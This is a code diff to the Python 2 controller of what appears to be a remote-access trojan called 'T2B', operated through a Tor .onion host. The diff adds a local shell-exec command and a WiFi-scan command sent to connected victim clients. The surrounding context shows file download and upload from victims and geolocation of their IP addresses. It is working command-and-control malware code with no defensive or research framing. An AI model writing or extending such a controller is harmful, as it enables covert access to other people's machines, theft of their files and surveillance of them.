@@ -5,7 +5,10 @@ from clint.textui import colored
 
 host = '3pnzzdpq7aj6s6b6.onion'
 hasher = hashlib.sha256()
-reader = geoip2.database.Reader('GeoLite2-City.mmdb')
+try:
+    reader = geoip2.database.Reader('GeoLite2-City.mmdb')
+except:
+    print "Can't load GEOIP2-Database"
 
 pid1 = subprocess.Popen(args=["xterm","-e","python net.py"]).pid
 
@@ -26,6 +29,10 @@ except socket.error, (value,message):
 def RecvData():
     temp = connstream.read()
     return temp
+
+def ExecIN(cmd):
+    p = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
+    print p.stdout.read()
 
 def DigGeoIp(ip):
     response = reader.city(ip)
@@ -111,7 +118,7 @@ while True:
         cType = RecvData()
         print ("%s----[new-client] " + str(fromaddr) + " :: " + cType + "%s") % (fg(202),attr(0))
         while True:
-            inText = raw_input(colored.blue('<T2B')+':'+colored.yellow(''+cType+'> '))
+            inText = raw_input(colored.blue('<T2B')+':'+colored.yellow(cType+'> '))
             if inText.startswith("download"):
                 SendData(inText)
                 DownloadFILE(inText.split(" ")[1])
@@ -119,6 +126,15 @@ while True:
                 SendData(inText)
                 UploadFILE(inText.split(" ")[1])
                 chunk = RecvData()
+            elif inText.startswith("!"):
+		ExecIN(inText.split("!")[1])
+            elif inText.startswith('s-wifi'):
+                card = raw_input("[*] Enter wifi card name (usualy wlan0): ")
+                SendData("ScanWIFI : " + card)
+                report = RecvData()
+                while report != "ScanWIFI-finished":
+                    print "|--- " + report
+                    report = RecvData()
             elif inText == "info":
                 SendData("info")
                 infos = RecvData()
